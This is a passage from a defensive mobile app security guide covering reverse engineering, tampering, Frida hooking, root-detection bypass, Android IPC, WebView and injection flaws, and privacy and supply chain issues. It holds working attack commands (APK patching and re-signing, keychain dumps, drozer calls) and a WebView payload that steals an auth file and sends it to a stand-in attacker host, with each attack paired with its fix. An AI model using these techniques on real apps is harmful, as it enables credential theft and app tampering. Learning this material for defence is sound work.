FIX: SecureRandom (Android) / SecRandomCopyBytes (iOS)

# 5. Rolling your own crypto or "obfuscation-as-encryption" (XOR, base64)
FIX: use platform crypto (Android Jetpack Security, CryptoKit on iOS) or libsodium
```

**The principle:** use the platform's high-level crypto libraries with authenticated encryption and hardware-backed keys; never invent algorithms; and internalise that on mobile the *key management* is the hard part — encryption is only as strong as the secrecy of a key that, on a device the attacker controls, must live in the Keystore/Secure Enclave to be safe at all.

---

# Part E — Reverse Engineering, Tampering & Runtime Attacks

This part is attacker position 4: the app on a device the attacker fully controls. Everything here is about the fact that **the binary is not a secret and client-side controls run inside the attacker's reach.** OWASP groups the defences under **M7 (insufficient binary protections)** — but the deeper lesson is that binary protections raise cost and never create a boundary.

---

## 16. Reverse engineering the binary

**What it is:** Decompiling and reading the app to understand its logic, find secrets, map the API, and locate the checks to defeat.

**Mechanism:** Android apps are Dalvik bytecode (DEX), which decompiles cleanly back to readable Java. iOS apps are compiled Mach-O, harder to read but fully disassemblable; Objective-C's runtime metadata makes class and method names recoverable, and Swift is increasingly so.

### The attack

```bash
# Android — from APK to readable Java in one step
jadx-gui app.apk                    # browse decompiled source, resources, manifest
apktool d app.apk                   # smali + decoded resources (for re-packaging, §17)

# Pull an installed app off the device first if you only have the phone:
adb shell pm path com.example.app   # find the APK path
adb pull /data/app/.../base.apk

# iOS — decrypt (App Store apps are encrypted) then analyse
# frida-ios-dump / on a jailbroken device to get the decrypted binary, then:
class-dump MyApp.app/MyApp          # Objective-C headers
ghidra / Hopper                     # disassembly and decompilation
```

### What the attacker learns

The complete client logic: hidden endpoints and parameters, hardcoded secrets (§14), the encryption scheme and where keys come from, feature flags and "premium" gates, the exact location of root-detection and pinning code to patch (§17) or hook (§18), and the request-signing algorithm if any.

### The fix / principle

You cannot prevent reverse engineering — you can only slow it and remove what it can find.

- **Ship nothing that must stay secret** (§14): no keys, no server-side logic, no "security by the client not knowing."
- **Obfuscate** (R8/ProGuard with aggressive renaming; commercial obfuscators; string encryption; native code for sensitive routines) to raise the reading cost. This is friction, not a wall.
- **Enforce on the server.** If reverse engineering reveals your API and the attacker can call it directly, the API must still authorize and validate every call. A reverse-engineered client should not be able to do anything a legitimate one could not.

---

## 17. Code tampering & repackaging

**What it is:** Modifying the app — patching out a check, injecting code, changing a resource — then re-signing and running it, or redistributing it as a trojanised clone.

**Mechanism:** After decompiling to smali (`apktool`), the attacker edits the check (e.g. flips the root-detection result), rebuilds, and signs with *their own* key. Android runs it — the signature only needs to be *valid*, not *yours*, on a device the attacker controls. iOS requires a jailbreak or a re-signing certificate but the same idea holds.

### The attack

```bash
apktool d app.apk -o out/
# edit out/smali/.../RootCheck.smali: make isRooted() return false (const/4 v0, 0x0)
apktool b out/ -o patched.apk
# sign with the attacker's own key and install
apksigner sign --ks attacker.keystore patched.apk
adb install patched.apk
# The app now runs with root detection disabled / premium unlocked / logging added.
```

Trojanised repackaging is a distribution attack: take a popular app, inject malware or an ad-fraud SDK, re-sign, and publish to a third-party store. Users who sideload get the backdoored version.

### The fix / principle

- **Tamper *detection*** (verify the app's own signing certificate at runtime, checksum critical code, detect debuggers) raises cost — but it runs in the tampered app, so a determined attacker patches the detector too. Useful as a layer, never as a boundary.
- **Server-side attestation is the real defence:** the **Play Integrity API** (Android) and **App Attest / DeviceCheck** (iOS) produce a signed statement, verified by Google/Apple on *your server*, that the running app is genuine, unmodified, and on a genuine device. Because verification happens server-side against a hardware-backed attestation, it is far harder to forge than any in-app check. Gate sensitive server operations on a valid attestation.
- **The bedrock:** the server must never depend on the client being untampered. Attestation reduces abuse; server-side authorization and validation prevent compromise.

---

## 18. Runtime manipulation (Frida / hooking / swizzling)

**What it is:** Instead of modifying the file, the attacker modifies the app *in memory while it runs* — hooking functions to change their behaviour, read arguments and return values, and dump secrets from memory. No re-signing needed.

**Mechanism:** Frida injects a JavaScript engine into the process and lets the attacker replace any function's implementation. On Android it hooks Java and native methods; on iOS it hooks Objective-C (via method swizzling) and native functions. `objection` packages the common attacks (pinning bypass, root bypass, Keychain dump, memory search) so no scripting is needed.

### The attack

```javascript
// Frida — read the plaintext argument to an encryption function as it's called,
// capturing the secret before it is ever encrypted
Java.perform(function () {
  var Crypto = Java.use('com.example.app.CryptoHelper');
  Crypto.encrypt.overload('java.lang.String').implementation = function (plaintext) {
    console.log('[+] encrypting: ' + plaintext);   // secret in the clear
    return this.encrypt(plaintext);
  };
});
```

```bash
# objection — one-liners for the common goals, no script needed
objection -g com.example.app explore
android hooking search classes Auth       # find interesting classes
android keystore list                     # inspect Keystore entries
memory search --string "token"            # scrape secrets from process memory
ios keychain dump                         # dump the iOS Keychain
```

### The fix / principle

- **Detect instrumentation** — check for the Frida server port/process, `frida-gadget` in loaded libraries, common hook artefacts, and debugger attachment. As with all client checks, this runs inside the attacker's reach and is itself hookable, so it is friction.
- **Key-bind and enclave-bind secrets** so that even memory scraping yields ciphertext or requires a live biometric (§7, §13) — reduce the window in which plaintext exists in memory.
- **Attestation and server-side enforcement** again: if hooking the client lets the attacker do something dangerous, the danger is that the *server* allowed it. Make the server the arbiter.

**The recurring truth of Part E:** reverse engineering, patching, and hooking are all *possible* and none can be *prevented*. The strategy is (1) ship no client secrets, (2) raise cost with obfuscation and detection, (3) verify genuineness with server-side attestation, and (4) enforce every real decision server-side so a fully compromised client can do no more than a legitimate one.

---

## 19. Root / jailbreak detection & its bypass

**What it is:** Detecting whether the app runs on a rooted/jailbroken device (where the sandbox is broken and instrumentation is easy) — and the attacker's routine bypass of that detection.

**Mechanism:** Detection looks for tell-tale signs: the `su` binary, root management apps (Magisk), writable system paths, test-keys build tags (Android); Cydia/Sileo, suspicious dylibs, ability to write outside the sandbox, `fork()` succeeding (iOS). The bypass hooks these checks to lie, or hides the root (Magisk Hide / Zygisk, Shamiko).

### The attack

```bash
# objection neutralises common detection in one command
objection -g com.example.app explore
android root disable        # or: ios jailbreak disable

# Or a Frida hook forcing the detector to return "not rooted";
# or Magisk DenyList to hide root from the app entirely.
```

### The fix / principle

Root/jailbreak detection is **a signal, not a gate.** It genuinely deters low-effort attackers and flags risky devices, but any competent attacker bypasses it. Use it to:

- **Feed a server-side risk decision** rather than making a local block — report device signals (ideally via **Play Integrity / App Attest**, which are hardware-attested and hard to forge) and let the server decide whether to allow a sensitive operation, step up authentication, or restrict functionality.
- **Layer, don't rely.** Combine multiple detection methods (they cost the attacker more to bypass together) but never assume "detection passed" means "device is safe."

The honest framing: on a rooted device the attacker owns everything the app can see. Detection lets you *react* (limit exposure, alert, refuse the riskiest actions); it does not restore the boundary root removed.

---

## 20. Insufficient binary protections

**What it is:** OWASP **M7** — the absence of the hardening that raises the cost of the Part E attacks: no obfuscation, no anti-debugging, no anti-tampering, no attestation, debuggable release builds.

### The checklist

```
[ ] Obfuscation enabled (R8/ProGuard with renaming; consider a commercial obfuscator
    and string/native protection for high-value logic)
[ ] Release build is NOT debuggable (android:debuggable="false"; strip iOS debug symbols)
[ ] No debug logging, no debug/test endpoints, no hidden dev menus in release (§30)
[ ] Anti-tampering: runtime signing-certificate / checksum verification (as a layer)
[ ] Anti-instrumentation: Frida/debugger detection (as a layer)
[ ] Root/jailbreak detection feeding a SERVER-SIDE risk decision (§19)
[ ] Play Integrity API (Android) / App Attest (iOS) verified server-side (§17)
[ ] No hardcoded secrets (§14); keys generated in Keystore/Secure Enclave (§7)
[ ] Certificate pinning with backup pins (§10)
```

**The principle:** binary protections are *defence in depth that raises attacker cost*, valuable for high-risk apps (banking, payments, DRM, anti-cheat) and largely optional for low-risk ones. They are worth deploying — and they are worthless as a substitute for server-side enforcement. Spend the effort in proportion to what a compromised client can actually reach, and put the real boundary on the server.

---

# Part F — IPC & Platform Attack Surface

This is attacker position 1: a malicious app already on the device, attacking yours across the OS's inter-process boundaries, plus the web-in-native surface of WebViews. This is the mobile equivalent of the web's cross-origin attacks — the boundary is the OS component model rather than the browser origin.

---

## 21. Android exported components

**What it is:** Android components (Activities, Services, Broadcast Receivers, Content Providers) marked `exported` are callable by *other apps*. Exporting one that performs a sensitive action, or leaks data, hands that capability to any app on the device.

**Mechanism:** A component is exported if `android:exported="true"`, or — on older `targetSdk` — implicitly if it declares an `<intent-filter>`. Another app sends it an intent (or queries the provider) and triggers its behaviour with the *victim app's* permissions.

### The attack

```xml
<!-- VULNERABLE — an exported activity that performs a privileged action -->
<activity android:name=".TransferActivity" android:exported="true">
    <intent-filter><action android:name="com.example.TRANSFER"/></intent-filter>
</activity>

<!-- VULNERABLE — an exported content provider with no permission -->
<provider android:name=".UserProvider" android:authorities="com.example.users"
          android:exported="true"/>   <!-- any app queries the user database -->
```

```bash
# A malicious app (or drozer) invokes the exported activity / reads the provider
drozer> run app.activity.start --component com.example com.example.TransferActivity \
        --extra string to attacker --extra string amount 10000
drozer> run app.provider.query content://com.example.users/accounts   # dumps data
```

### The fix

```xml
<!-- Export nothing you don't have to. Default to false. -->
<activity android:name=".TransferActivity" android:exported="false"/>

<!-- If a component MUST be exported, protect it with a signature-level permission
     so only apps signed by the same key can call it -->
<permission android:name="com.example.permission.PRIVATE"
            android:protectionLevel="signature"/>
<service android:name=".SyncService" android:exported="true"
         android:permission="com.example.permission.PRIVATE"/>
```

**The principle:** set `android:exported` explicitly and default it to `false`. Export only what genuinely needs cross-app access, protect it with a `signature`-level permission (callable only by your own co-signed apps) or a strong runtime permission, and validate every incoming intent's data. Content providers must enforce read/write permissions and use parameterised queries (§25).

---

## 22. Android Intent attacks & deep links

**What it is:** Abuse of the intent system — intent redirection, intent sniffing, and malicious deep links — to hijack flows, leak data, or reach internal components.

### The variants

**Intent redirection ("intent forwarding"):** an exported component reads an `Intent` (or an extra) from the caller and `startActivity`/`startService`s it. A malicious app supplies an intent pointing at an internal, non-exported component — the victim app forwards it *with its own privileges*, defeating the export boundary.

```java
// VULNERABLE — forwards an attacker-supplied intent
Intent forwarded = getIntent().getParcelableExtra("next");
startActivity(forwarded);   // attacker points "next" at an internal component
```

**Implicit intent eavesdropping:** sending sensitive data via an *implicit* intent (no explicit target) lets any app with a matching filter receive it. Use explicit intents for sensitive data; use `LocalBroadcastManager` / in-process delivery, not system broadcasts, for internal events.

**Deep link hijacking / parameter injection:** a deep link (`myapp://pay?to=...&amount=...`) that drives a sensitive action lets a malicious page or app trigger it with attacker-chosen parameters, and — with a WebView (§24) — can smuggle in XSS or open arbitrary URLs.

### The fix / principle

- Validate the *source and contents* of every incoming intent; never blindly forward an attacker-supplied `Intent` or point one at a component by attacker-controlled name.
- Use **explicit** intents for anything sensitive; keep internal events in-process.
- Treat deep-link parameters as **untrusted input** — validate, authenticate, and never let a deep link perform a state-changing action without the same authorization a normal flow requires. Prefer **Android App Links** (verified via `assetlinks.json`) over unverified custom schemes so another app cannot claim your link.

---

## 23. iOS URL schemes & universal links

**What it is:** The iOS equivalents of deep links. Custom URL schemes (`myapp://`) can be *claimed by any app*, so they are not a trust boundary; universal links are verified but still deliver untrusted input.

**Mechanism:** If two apps register the same custom scheme, iOS's choice of handler is undefined — a malicious app can register your scheme and intercept links intended for you (scheme hijacking). Even for your own links, the parameters are attacker-controllable.

### The attack

```
# A malicious app registers CFBundleURLSchemes = ["mybank"]. Now a link
# mybank://transfer?... may open the attacker's app, or the attacker crafts
# links to your app that trigger sensitive actions with chosen parameters.

# Data leakage: an app that returns sensitive data via a callback URL scheme
# (OAuth tokens via myapp://callback?token=...) can leak to a scheme-squatting app.
```

### The fix / principle

- **Prefer Universal Links** over custom schemes. Universal Links are HTTPS URLs verified against an `apple-app-site-association` file you host, so another app *cannot* claim them — this is the iOS analogue of Android App Links.
- **Treat all incoming URL parameters as untrusted:** validate them, and never let a link perform a sensitive action without proper authorization.
- **Do not return secrets via custom-scheme callbacks** (a reason OAuth on mobile uses PKCE and, ideally, universal-link or `ASWebAuthenticationSession` redirects). Validate the source where possible.

---

## 24. WebView vulnerabilities

**What it is:** Native apps embed web content in a WebView; misconfiguration bridges the untrusted web world into the native app — enabling XSS-to-native escalation, local file theft, and arbitrary URL loading.

**Mechanism:** A WebView is a browser inside your app with, potentially, a bridge to native code. Three settings turn a web bug into a native compromise: a JavaScript↔native bridge, file access, and loading untrusted content.

### The dangerous configurations

**Android — `addJavascriptInterface` exposes native methods to JS**

```kotlin
// VULNERABLE — any JavaScript in the WebView can call native methods.
// Pre-Android 4.2 this allowed reflection to Runtime.exec (RCE). Even now,
// an exposed object's methods are callable by any loaded page.
webView.addJavascriptInterface(NativeBridge(), "Android")
webView.settings.javaScriptEnabled = true
webView.settings.allowFileAccess = true          // JS can read file://
webView.settings.allowUniversalAccessFromFileURLs = true   // file:// reads any origin

// If this WebView loads attacker-influenced content (a deep link URL, an
// http page over MITM, user content), the attacker's JS calls Android.*.
```

**iOS — `WKWebView` message handlers and file access**

```swift
// A message handler bridges JS to native; if the loaded content is untrusted,
// the web side drives native behaviour.
config.userContentController.add(self, name: "nativeBridge")
// loading untrusted content into a WebView with a bridge = web XSS → native calls
```

### The attack

```javascript
// Inside a WebView that exposed a bridge and loaded attacker content:
Android.getAuthToken();                    // call an exposed native method
// or steal local files if allowFileAccess/UniversalAccess are on:
fetch('file:///data/data/com.example.app/shared_prefs/auth.xml')
  .then(r => r.text()).then(d => fetch('https://attacker/x?d=' + d));
```

### The fix / principle

- **Only load trusted, first-party HTTPS content** in a WebView that has a native bridge. Never load untrusted or user-supplied URLs into a bridged WebView.
- **Minimise the bridge:** expose the fewest possible native methods; on Android, `@JavascriptInterface`-annotate only what must be exposed and validate every call; assume any exposed method can be called by any loaded page.
- **Disable file access** unless required: `allowFileAccess=false`, `allowUniversalAccessFromFileURLs=false`, `allowFileAccessFromFileURLs=false`.
- **Apply web defences inside the WebView:** the content is still subject to XSS (web guide §15–20), so encode output and apply a CSP; validate any `postMessage`/handler input.
- **Restrict navigation** with a URL allowlist (`shouldOverrideUrlLoading` / `WKNavigationDelegate`) so the WebView cannot be steered to attacker origins.

---

## 25. Client-side injection (SQLite, path)

**What it is:** The classic injection bugs, on-device: SQL injection into a local SQLite query, and path traversal into local file access. Lower impact than server-side (it is the user's own data on their own device) — *except* across the IPC boundary, where an exported content provider (§21) turns local SQLi into a cross-app data breach.

### The attack

```java
// VULNERABLE — user input concatenated into a local query
String q = "SELECT * FROM notes WHERE title = '" + userInput + "'";
db.rawQuery(q, null);
// If this provider is EXPORTED, a malicious app injects via the query and
// reads the whole table across the sandbox: title = ' OR '1'='1

// Content provider path traversal — openFile without confining the path
// content://com.example/files/../../databases/users.db  → serves another file
```

### The fix

```java
// Parameterised query — same principle as web SQLi (§1)
db.rawQuery("SELECT * FROM notes WHERE title = ?", new String[]{ userInput });

// Content provider: enforce permissions, parameterise, canonicalise file paths
// (verify the resolved path stays within the intended directory — web §31)
```

**The principle:** parameterise on-device queries and canonicalise on-device paths exactly as on the server. The stakes rise sharply when the data is reachable through an exported component, at which point local injection becomes a cross-app breach — so the fix and the export review (§21) go together.

---

# Part G — Privacy, Side Channels, Supply Chain & Config

The residual surface: data that leaks not through a datastore or the network but through the platform's incidental features, third-party code, and misconfiguration. OWASP covers this under **M2 (supply chain)**, **M6 (privacy)**, and **M8 (misconfiguration)**.

---

## 26. Side-channel data leakage

**What it is:** Sensitive data escaping through OS features that developers forget are observable or persistent — the app-switcher snapshot, the clipboard, notifications, keyboard caches, and logs.

### The channels

**App-switcher / backgrounding snapshot.** When an app backgrounds, both platforms capture a screenshot for the task switcher. If a sensitive screen (banking balance, card number, OTP) is visible, that image is written to disk.

```swift
// iOS — blur or cover the screen before it is snapshotted
func applicationDidEnterBackground(_ app: UIApplication) {
    window?.addSubview(privacyBlurView)   // hide sensitive content in the snapshot
}
```
```kotlin
// Android — prevent screenshots (and the switcher thumbnail) on sensitive screens
window.setFlags(WindowManager.LayoutParams.FLAG_SECURE,
                WindowManager.LayoutParams.FLAG_SECURE)
```

**Clipboard** (§8) — other apps read it; avoid copying secrets, expire what you must.

**Lock-screen notifications** — a notification previewing an OTP or message body is readable without unlocking. Mark sensitive notifications private (Android `VISIBILITY_SECRET`; iOS hidden previews) so the content shows only when unlocked.

**Keyboard cache & autofill** (§8) — mark secret fields so predictive text does not learn them.

**Logs** (§8) — `logcat` / device console; never log sensitive data.

**The principle:** enumerate every OS feature that can *observe or persist* what is on screen or in memory — screenshots, clipboard, notifications, keyboard, logs, accessibility services — and suppress sensitive data in each. These leaks bypass all your storage and transport controls because they happen at the OS layer.

---

## 27. Inadequate privacy controls

**What it is:** OWASP **M6** — collecting, transmitting, or exposing more personal data than necessary, mishandling permissions, and leaking PII to third parties (often via SDKs, §28).

### The failures

- **Over-broad permissions** — requesting location/contacts/camera not needed for the feature, expanding what a compromise or a malicious SDK can reach.
- **Excessive collection & transmission** — sending device identifiers, contacts, or precise location to the backend or analytics without need or consent.
- **PII in insecure places** — in logs (§8), in the clipboard, in analytics events, in crash reports.
- **Identifier misuse** — using persistent hardware identifiers for tracking (and, on modern OSes, being blocked or penalised for it).

### The fix / principle

- **Data minimisation:** collect and transmit only what the feature needs; prefer on-device processing.
- **Least-privilege permissions:** request the narrowest permission, at the moment it is needed, and degrade gracefully if denied. Use scoped/one-time grants (photo picker, approximate location).
- **Respect platform privacy frameworks:** iOS App Tracking Transparency and privacy manifests; Android's scoped storage, permission model, and Data Safety declarations. Use resettable advertising IDs, never hardware identifiers, for any tracking.
- **Vet what SDKs collect** (§28) — third-party code is a leading cause of silent PII exfiltration.

---

## 28. Third-party SDK & supply chain risk

**What it is:** OWASP **M2** — the analytics, ads, crash-reporting, and utility SDKs bundled into the app run with the app's full permissions and can leak data, contain vulnerabilities, or be outright malicious. (This is the mobile face of the web guide's §50.)

**Mechanism:** An SDK is code you did not write, running inside your sandbox, with your permissions and network access. A compromised, malicious, or merely careless SDK can exfiltrate user data, add vulnerabilities (an insecure WebView, a hardcoded key), inflate your attack surface, and even repackage-attack you at build time.

### The risks

```
- Data exfiltration: an ad/analytics SDK harvests contacts, location, clipboard,
  or PII and ships it to its own servers — often silently, sometimes maliciously.
- Vulnerable SDK: a bug in the SDK (insecure deserialization, WebView misconfig)
  becomes YOUR vulnerability.
- Malicious update: a benign SDK's update is trojanised (the mobile version of a
  dependency-confusion / maintainer-compromise attack).
- Excessive permissions: the SDK's manifest merges permissions into your app.
- Native library risk: a bundled .so / framework with its own memory-safety bugs.
```

### The fix / principle

- **Inventory every SDK** and the permissions and data each requires; remove those you do not need.
- **Pin versions and monitor** for updates and CVEs (SCA tools; the same lockfile/integrity discipline as the web guide §50).
- **Vet behaviour:** run the app through a proxy and MobSF to see what each SDK actually sends; scrutinise ad/analytics SDKs especially.
- **Constrain permissions** the SDK inherits; prefer SDKs with a clear privacy posture and a published SBOM.
- **Isolate where possible** (separate process, restricted capabilities) for high-risk third-party code.

---

## 29. Push notifications & tokens

**What it is:** Weaknesses around push (FCM/APNs) — leaking sensitive content in notification payloads, mishandling device tokens, and unauthenticated push endpoints.

### The failures & fixes

- **Sensitive data in the payload** — OTPs, message bodies, balances in the push notification are visible on the lock screen (§26) and pass through the push provider. *Fix: send a content-free "you have a new message" and fetch the detail in-app after authentication; mark previews private.*
- **Device token as a secret it is not** — the FCM/APNs token identifies a device install; treat it as sensitive routing data, bind it to the authenticated user server-side, and rotate/invalidate on logout. *A leaked token lets an attacker send pushes to that device only if your push-send endpoint is unauthenticated.*
- **Unauthenticated / spoofable push-send path** — ensure only your authenticated backend can trigger pushes; never expose the provider server key in the app (§14).

**The principle:** notification content is semi-public (lock screen + provider), so keep secrets out of it; device tokens are user-linked routing identifiers to protect and rotate; and the send path is a privileged server operation, never a client one.

---

## 30. Security misconfiguration & extraneous functionality

**What it is:** OWASP **M8** — insecure defaults and, specifically for mobile, *extraneous functionality*: debug code, test endpoints, hidden admin gestures, and verbose diagnostics shipped in the release build.

### The failures

```xml
<!-- Debuggable release build — attach a debugger without any exploit -->
<application android:debuggable="true">        <!-- must be false in release -->
```
```
- Test/staging endpoints hardcoded and reachable in production builds
- Hidden developer menus / cheat codes that unlock features or bypass checks
- Verbose logging and crash reports leaking internals (§8, §40)
- Backup enabled on sensitive data (§5); permissive file modes; exported components (§21)
- Default or sample credentials left in the app or its backend
- Disabled security features "temporarily" for development and never re-enabled
  (ATS off §9, pinning off, trust-all TrustManager §9)
```

### The fix / principle

Maintain a **release hardening checklist** and enforce it in CI:

```
[ ] debuggable = false; debug symbols stripped
[ ] no test/staging endpoints, no debug menus, no dead code in release
[ ] logging stripped; no verbose crash detail to third parties
[ ] allowBackup handled (§5); components exported explicitly and minimally (§21)
[ ] ATS on / cleartext blocked (§9); pinning on (§10); no trust-all code
[ ] obfuscation on (§20); no hardcoded secrets (§14, scan in CI)
[ ] permissions minimised (§27); privacy manifests complete
```

**The principle:** the release build is the artifact an attacker gets — it must contain nothing that was convenient during development and dangerous in production. Automate the checklist so "we forgot to turn X back on" cannot happen. This category, like the web guide's §52, overlaps every other: a single left-on debug flag or test endpoint re-opens doors the rest of the document worked to close.

---
# Appendix A — OWASP Mobile Top 10 (2024) mapping

The OWASP Mobile Top 10 was refreshed in 2024. Every section of this guide maps to one or more categories. Use this to check coverage and to speak the standard's language in reports.

| # | Category (2024) | What it means | Sections here |
|---|---|---|---|
| **M1** | Improper Credential Usage | Hardcoded/embedded secrets; misused credentials | §14, §12 |
| **M2** | Inadequate Supply Chain Security | Malicious/vulnerable SDKs, build-chain compromise | §28, §29 |
| **M3** | Insecure Authentication/Authorization | Client-side or client-trusted auth; broken authz | §12, §13, §30 (IDOR ↔ web §30) |
| **M4** | Insufficient Input/Output Validation | Injection, unvalidated intents/URLs/WebView input | §22, §23, §24, §25 |
| **M5** | Insecure Communication | Cleartext, weak TLS, no pinning, MITM | §9, §10, §11 |
| **M6** | Inadequate Privacy Controls | Over-collection, PII leakage, permission misuse | §26, §27, §29 |
| **M7** | Insufficient Binary Protections | No obfuscation/anti-tamper/attestation; debuggable | §16, §17, §18, §19, §20 |
| **M8** | Security Misconfiguration | Insecure defaults, debug code, extraneous functionality | §30, §5, §9, §21 |
| **M9** | Insecure Data Storage | Sensitive data in unprotected local storage | §4, §5, §6, §7, §8 |
| **M10** | Insufficient Cryptography | Weak/homegrown crypto, key management failures | §15, §7 (key storage) |

> The 2024 list added **M1 (Improper Credential Usage)** and **M2 (Supply Chain)** as top entries and reframed several categories versus the 2016 list (which had "M1 Improper Platform Usage" and "M2 Insecure Data Storage"). If a report or course references the **2016** list, the biggest differences are: 2016's M1 (Improper Platform Usage) is now spread across M3/M8, and storage moved from M2 to M9.

---

# Appendix B — MASVS / MASTG mapping

OWASP's **Mobile Application Security Verification Standard (MASVS)** defines *what* to verify; the **Mobile Application Security Testing Guide (MASTG)** defines *how* to test it. Together they are the authoritative framework for mobile security testing. The current MASVS groups requirements into these control families:

| MASVS group | Focus | Sections here |
|---|---|---|
| **MASVS-STORAGE** | Secure storage of sensitive data | §4–§8 |
| **MASVS-CRYPTO** | Correct cryptography & key management | §7, §15 |
| **MASVS-AUTH** | Authentication & authorization | §12, §13 |
| **MASVS-NETWORK** | Secure network communication | §9, §10, §11 |
| **MASVS-PLATFORM** | Safe use of platform APIs & IPC | §21–§25, §26 |
| **MASVS-CODE** | Data quality & secure coding (updates, deps) | §25, §28, §30 |
| **MASVS-RESILIENCE** | Resistance to reverse engineering & tampering | §16–§20 |
| **MASVS-PRIVACY** | Privacy of user data | §26, §27, §29 |

MASVS also defines **verification levels** (roughly: L1 baseline for all apps, L2 defence-in-depth for apps handling sensitive data, and a **R** resilience profile for apps needing tamper-resistance). Map your app's risk to a level, then use the MASTG test cases for each requirement. The **MAS Checklist** is a spreadsheet linking every MASVS requirement to its MASTG tests — use it as your audit worksheet.

---

# Appendix C — Mobile pentest toolkit

The tools referenced throughout, grouped by task. Set up an emulator/rooted-jailbroken test device plus a proxy, and most assessments start there.

**Static analysis / decompilation**
- **jadx / jadx-gui** — APK → readable Java (§16)
- **apktool** — decode/rebuild APK resources & smali (§16, §17)
- **MobSF (Mobile Security Framework)** — automated static+dynamic analysis for Android & iOS; a great first pass (§28, §30)
- **class-dump / Hopper / Ghidra / IDA** — iOS/native disassembly & decompilation (§16)
- **strings, grep** — fast hardcoded-secret discovery (§14)

**Dynamic analysis / runtime**
- **Frida** — universal hooking/instrumentation engine (§11, §18)
- **objection** — Frida-powered toolkit: pinning bypass, root/jailbreak bypass, Keychain dump, memory search (§11, §18, §19)
- **drozer** — Android IPC/attack-surface assessment: exported components, providers, intents (§21, §22)

**Network**
- **Burp Suite / OWASP ZAP / mitmproxy** — intercepting proxy for traffic analysis and MITM testing (§9–§11)
- **frida-ios-dump** — pull a decrypted iOS binary from a jailbroken device (§16)

**Device / environment**
- **Android Studio emulator / Genymotion**, **rooted test device (Magisk)** — Android
- **jailbroken iOS device / iOS Simulator (limited)** — iOS
- **adb** — Android debugging, file pull, app inspection (§8, §16)

**Secret / dependency scanning (CI)**
- **truffleHog, gitleaks** — hardcoded-secret detection (§14)
- **SCA tools (OWASP Dependency-Check, Snyk, etc.)** — vulnerable SDK/library detection (§28)

**Attestation & integrity (defensive)**
- **Play Integrity API** (Android), **App Attest / DeviceCheck** (iOS) — server-verified genuineness (§17, §19)

---

# Appendix D — Further reading & external resources

Authoritative, stable references for going deeper on every topic in this guide.

**OWASP — the core mobile references**
- OWASP Mobile Application Security (MAS) project home — https://mas.owasp.org/
- OWASP Mobile Top 10 (2024) — https://owasp.org/www-project-mobile-top-10/
- OWASP MASVS (verification standard) — https://mas.owasp.org/MASVS/
- OWASP MASTG (testing guide) — https://mas.owasp.org/MASTG/
- OWASP MAS Checklist — https://mas.owasp.org/checklists/
- OWASP MASTG tools & techniques — https://mas.owasp.org/MASTG/tools/

**Android — official security documentation**
- App security best practices — https://developer.android.com/privacy-and-security/security-tips
- Android Keystore system — https://developer.android.com/privacy-and-security/keystore
- Jetpack Security (EncryptedSharedPreferences / EncryptedFile) — https://developer.android.com/topic/security/data
- Network security configuration — https://developer.android.com/privacy-and-security/security-config
- BiometricPrompt / biometric auth — https://developer.android.com/identity/sign-in/biometric-auth
- Play Integrity API — https://developer.android.com/google/play/integrity
- App permissions best practices — https://developer.android.com/guide/topics/permissions/overview
- Android platform security model (paper) — https://source.android.com/docs/security

**Apple / iOS — official security documentation**
- Apple Platform Security guide (the definitive reference) — https://support.apple.com/guide/security/welcome/web
- Keychain services — https://developer.apple.com/documentation/security/keychain_services
- Data Protection / protecting keys with the Secure Enclave — https://developer.apple.com/documentation/security
- Local Authentication (Face ID / Touch ID) — https://developer.apple.com/documentation/localauthentication
- App Transport Security — https://developer.apple.com/documentation/security/preventing_insecure_network_connections
- Establishing your app's integrity (App Attest) — https://developer.apple.com/documentation/devicecheck
- Supporting Universal Links — https://developer.apple.com/documentation/xcode/supporting-universal-links-in-your-app

**Tooling**
- Frida documentation — https://frida.re/docs/home/
- objection — https://github.com/sensepost/objection
- MobSF — https://github.com/MobSF/Mobile-Security-Framework-MobSF
- jadx — https://github.com/skylot/jadx
- drozer — https://github.com/WithSecureLabs/drozer
- Burp Suite — https://portswigger.net/burp / mitmproxy — https://mitmproxy.org/

**Learning & practice**
- OWASP MAS "crackmes" (deliberately vulnerable apps to practise on) — https://mas.owasp.org/crackmes/
- DIVA / InsecureBankv2 (vulnerable Android apps) — widely mirrored on GitHub
- iGoat (vulnerable iOS app, OWASP) — https://github.com/OWASP/igoat
- Hacker101 mobile content & HackerOne reports — https://www.hacker101.com/
- MOBISEC / mobile hacking labs and the PortSwigger Web Security Academy (for the shared web-layer bugs) — https://portswigger.net/web-security

**Cross-reference:** this guide's companion, [web_security_attacks_complete_guide.md](web_security_attacks_complete_guide.md), covers the server-side and web-layer bugs (injection, XSS, IDOR, auth, crypto, deserialization, supply chain) that mobile apps inherit through their APIs and WebViews.

---

*End of guide. Mobile security reduces to one discipline applied everywhere: the device is the attacker's, so store nothing you can't afford to lose, transmit only over verified channels, keep every real decision on the server, and treat client-side hardening as cost-raising friction — never as a boundary.*

